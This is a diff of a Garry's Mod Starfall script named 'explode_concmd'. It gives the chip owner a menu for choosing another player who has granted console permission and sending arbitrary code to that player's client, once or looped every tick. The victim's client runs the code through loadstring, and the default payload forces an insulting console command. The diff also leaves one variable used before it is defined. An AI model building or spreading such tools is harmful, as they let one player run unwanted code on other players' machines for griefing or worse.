@@ -1,143 +1,128 @@
---@name explode_concmd
---@author Friztailo
---@shared
-/*
-        __________  _________ _________    ______    ____ 
-       / ____/ __ \/  _/__  //_  __/   |  /  _/ /   / __ \
-      / /_  / /_/ // /   / /  / / / /| |  / // /   / / / /
-     / __/ / _, _// /   / /__/ / / ___ |_/ // /___/ /_/ / 
-    /_/   /_/ |_/___/  /____/_/ /_/  |_/___/_____/\____/      
-    Discord Server: GMOD E2/SF nado? >> https://discord.gg/6Q5NnHQTrh
-*/
+if CLIENT and player() == owner() then
+    enableHud(owner(), true)
+    --@include https://pastebin.com/raw/G5SU8y9U as valeras/vgui/vgui.txt
+    gui = require("valeras/vgui/vgui.txt"):new("hud", string.lower(key), false, false)
 
-function run(key)
-        if CLIENT and player() == owner() then
-            enableHud(owner(), true)
-            --@include https://pastebin.com/raw/G5SU8y9U as valeras/vgui/vgui.txt
-            gui = require("valeras/vgui/vgui.txt"):new("hud", string.lower(key), false, false)
+    local Select = {player = owner()}
+    local Code = 'concmd("i`m gondon")'
+    local Loop = false
 
-            local Select = {player = owner()}
-            local Code = 'concmd("i`m gondon")'
-            local Loop = false
+    local title = "explode_concmd by Friztailo"
 
-            local title = chip():getChipName().." by Friztailo"
+    local resX, resY = gui:getResolution()
+    local ratio = resX / resY
+    local key, keyDefault = "MOUSE1", "MOUSE2"
+    local rw, rh = resX / 1920, resY / 1080
 
-            local resX, resY = gui:getResolution()
-            local ratio = resX / resY
-            local key, keyDefault = "MOUSE1", "MOUSE2"
-            local rw, rh = resX / 1920, resY / 1080
+    local Label = gui:addComponent("label", resX/2 - resX/3/2,  resY/2 - resY/3/2, resX/3, resY/3, Theme, key)
+    Label:setDraggable(true)
+    Label:setDragSize(Vector(Label:getW(), 18))
+    Label:setTitle(title)
+    Label.players = {}
 
-            local Label = gui:addComponent("label", resX/2 - resX/3/2,  resY/2 - resY/3/2, resX/3, resY/3, Theme, key)
-            Label:setDraggable(true)
-            Label:setDragSize(Vector(Label:getW(), 18))
-            Label:setTitle(title)
-            Label.players = {}
+    Label.selectPlayer = gui:addComponent("button", resX/3/3, Label:getDragSize()[2], resX/3 - resX/3/3, Label:getDragSize()[2] * 2, theme, key)
+    Label.selectPlayer:setText(Select.player:getName(), TEXT_ALIGN.CENTER)
+    Label.selectPlayer:setParent(Label)
+    function Label.selectPlayer:onClick() print(Select.player:getName().."\n"..Select.player:getSteamID().."\n"..Select.player:getSteamID64()) end
 
-            Label.selectPlayer = gui:addComponent("button", resX/3/3, Label:getDragSize()[2], resX/3 - resX/3/3, Label:getDragSize()[2] * 2, theme, key)
-            Label.selectPlayer:setText(Select.player:getName(), TEXT_ALIGN.CENTER)
-            Label.selectPlayer:setParent(Label)
-            function Label.selectPlayer:onClick() print(Select.player:getName().."\n"..Select.player:getSteamID().."\n"..Select.player:getSteamID64()) end
+    Label.run = gui:addComponent("button", resX/3/3, Label:getDragSize()[2] * 3, (resX/3 - resX/3/3)/2, Label:getDragSize()[2] * 2, theme, key)
+    Label.run:setText("Run", TEXT_ALIGN.CENTER)
+    Label.run:setParent(Label)
+    function Label.run:onClick()
+        if not Code or not Select then return end
+        local toSend = (Loop and [[hook.add("think","adminmenu",function() ]] or "")..Code..(Loop and [[ end)]] or "")
 
-            Label.run = gui:addComponent("button", resX/3/3, Label:getDragSize()[2] * 3, (resX/3 - resX/3/3)/2, Label:getDragSize()[2] * 2, theme, key)
-            Label.run:setText("Run", TEXT_ALIGN.CENTER)
-            Label.run:setParent(Label)
-            function Label.run:onClick()
-                if not Code or not Select then return end
-                local toSend = (Loop and [[hook.add("think","adminmenu",function() ]] or "")..Code..(Loop and [[ end)]] or "")
+        net.start("functoServer")
+        net.writeUInt(Select.player:getUserID(),8)
+        net.writeString(toSend)
+        net.send(nil,false)
+    end
 
-                net.start("functoServer")
-                net.writeUInt(Select.player:getUserID(),8)
-                net.writeString(toSend)
-                net.send(nil,false)
+    Label.loop = gui:addComponent("button", resX/3/3 + (resX/3 - resX/3/3)/2, Label:getDragSize()[2] * 3, (resX/3 - resX/3/3)/2,        Label:getDragSize()[2] * 2, theme, key)
+    Label.loop:setText("Loop", TEXT_ALIGN.CENTER)
+    Label.loop:setToggle(true)
+    Label.loop:setParent(Label)
+    function Label.loop:onClick() Loop = !Loop end
+
+    Label.stop = gui:addComponent("button", resX/3/3, Label:getDragSize()[2] * 5, resX/3 - resX/3/3, Label:getDragSize()[2] * 2, theme, key)
+    Label.stop:setText("Stop", TEXT_ALIGN.CENTER)
+    Label.stop:setParent(Label)
+    function Label.stop:onClick()
+        net.start("functoServer")
+        net.writeUInt(Select.player:getUserID(),8)
+        net.writeString([[hook.remove("think","adminmenu")]])
+        net.send(nil,false)
+    end
+
+    Label.code = gui:addComponent("textentry", resX/3/3, Label:getDragSize()[2] * 7, resX/3 - resX/3/3, resY/3 - Label:getDragSize()[2] * 7, Theme)
+    Label.code:setValue(Code)
+    Label.code:setParent(Label)
+    Label.code:allowMarkup(true)
+    Label.code:setAlign(TEXT_ALIGN.LEFT)
+    function Label.code:onFinish(txt) Code = txt end
+
+    Label.listbox = gui:addComponent("listbox", 0, Label:getDragSize()[2], resX/3/3, resY/3 - Label:getDragSize()[2])
+    Label.listbox:setParent(Label)
+
+    net.receive("toOwnerPerms",function()
+        local bool = net.readBit() == 1 and true or false
+        local plyU = net.readUInt(8)
+        local ply = player(plyU)
+        local plybut = Label.listbox:addComponent("button", X, Y, W, 32, nil, key)
+        plybut:setText(ply:getName(), TEXT_ALIGN.CENTER)
+        plybut.player = ply
+        plybut.canConsole = bool
+        plybut:setTextColor(bool and Color(50,150,50) or Color(255,50,50))
+        function plybut:onClick()
+            if bool then
+                Select = self
+                Label.selectPlayer:setText(self.player:getName(), TEXT_ALIGN.CENTER)
+            else
+                print("Player not have permission console.command!")
             end
-
-            Label.loop = gui:addComponent("button", resX/3/3 + (resX/3 - resX/3/3)/2, Label:getDragSize()[2] * 3, (resX/3 - resX/3/3)/2,        Label:getDragSize()[2] * 2, theme, key)
-            Label.loop:setText("Loop", TEXT_ALIGN.CENTER)
-            Label.loop:setToggle(true)
-            Label.loop:setParent(Label)
-            function Label.loop:onClick() Loop = !Loop end
-
-            Label.stop = gui:addComponent("button", resX/3/3, Label:getDragSize()[2] * 5, resX/3 - resX/3/3, Label:getDragSize()[2] * 2, theme, key)
-            Label.stop:setText("Stop", TEXT_ALIGN.CENTER)
-            Label.stop:setParent(Label)
-            function Label.stop:onClick()
-                net.start("functoServer")
-                net.writeUInt(Select.player:getUserID(),8)
-                net.writeString([[hook.remove("think","adminmenu")]])
-                net.send(nil,false)
-            end
-
-            Label.code = gui:addComponent("textentry", resX/3/3, Label:getDragSize()[2] * 7, resX/3 - resX/3/3, resY/3 - Label:getDragSize()[2] * 7, Theme)
-            Label.code:setValue(Code)
-            Label.code:setParent(Label)
-            Label.code:allowMarkup(true)
-            Label.code:setAlign(TEXT_ALIGN.LEFT)
-            function Label.code:onFinish(txt) Code = txt end
-
-            Label.listbox = gui:addComponent("listbox", 0, Label:getDragSize()[2], resX/3/3, resY/3 - Label:getDragSize()[2])
-            Label.listbox:setParent(Label)
-
-            net.receive("toOwnerPerms",function()
-                local bool = net.readBit() == 1 and true or false
-                local plyU = net.readUInt(8)
-                local ply = player(plyU)
-                local plybut = Label.listbox:addComponent("button", X, Y, W, 32, nil, key)
-                plybut:setText(ply:getName(), TEXT_ALIGN.CENTER)
-                plybut.player = ply
-                plybut.canConsole = bool
-                plybut:setTextColor(bool and Color(50,150,50) or Color(255,50,50))
-                function plybut:onClick()
-                    if bool then
-                        Select = self
-                        Label.selectPlayer:setText(self.player:getName(), TEXT_ALIGN.CENTER)
-                    else
-                        print("Player not have permission console.command!")
-                    end
-                end
-                table.insert(Label.players, plybut)
-            end)
         end
-
-        if CLIENT then
-            net.start("perms")
-            net.writeBit(hasPermission("console.command") and 1 or 0)
-            net.send(nil,false)
-
-            net.receive("functoClient",function(len,ply)
-                local a = net.readString()
-                local func = loadstring([[return ]]..a)
-                if type(func) ~= "function" then return end
-                try(func())
-            end)
-
-            net.receive("PlayerInitialSpawn",function(len,ply)
-                net.start("perms")
-                net.writeBit(hasPermission("console.command") and 1 or 0)
-                net.send(nil,false)
-            end)
-        end
-
-        if SERVER then
-            chip():setSolid(false)
-
-            hook.add("PlayerInitialSpawn","first",function(ply)
-                net.start("PlayerInitialSpawn")
-                net.send(ply,false)
-            end)
-
-            net.receive("perms",function(len,ply)
-                net.start("toOwnerPerms")
-                net.writeBit(net.readBit())
-                net.writeUInt(ply:getUserID(),8)
-                net.send(owner(),false)
-            end)
-
-            net.receive("functoServer",function(len,ply)
-                net.start("functoClient")
-                local ply = player(net.readUInt(8))
-                net.writeString(net.readString())
-                net.send(ply,false)
-            end)
-        end
+        table.insert(Label.players, plybut)
+    end)
 end
-return run
+
+if CLIENT then
+    net.start("perms")
+    net.writeBit(hasPermission("console.command") and 1 or 0)
+    net.send(nil,false)
+
+    net.receive("functoClient",function(len,ply)
+        local a = net.readString()
+        local func = loadstring([[return ]]..a)
+        if type(func) ~= "function" then return end
+        try(func())
+    end)
+
+    net.receive("PlayerInitialSpawn",function(len,ply)
+        net.start("perms")
+        net.writeBit(hasPermission("console.command") and 1 or 0)
+        net.send(nil,false)
+    end)
+end
+
+if SERVER then
+    chip():setSolid(false)
+
+    hook.add("PlayerInitialSpawn","first",function(ply)
+        net.start("PlayerInitialSpawn")
+        net.send(ply,false)
+    end)
+
+    net.receive("perms",function(len,ply)
+        net.start("toOwnerPerms")
+        net.writeBit(net.readBit())
+        net.writeUInt(ply:getUserID(),8)
+        net.send(owner(),false)
+    end)
+
+    net.receive("functoServer",function(len,ply)
+        net.start("functoClient")
+        local ply = player(net.readUInt(8))
+        net.writeString(net.readString())
+        net.send(ply,false)
+    end)
+end
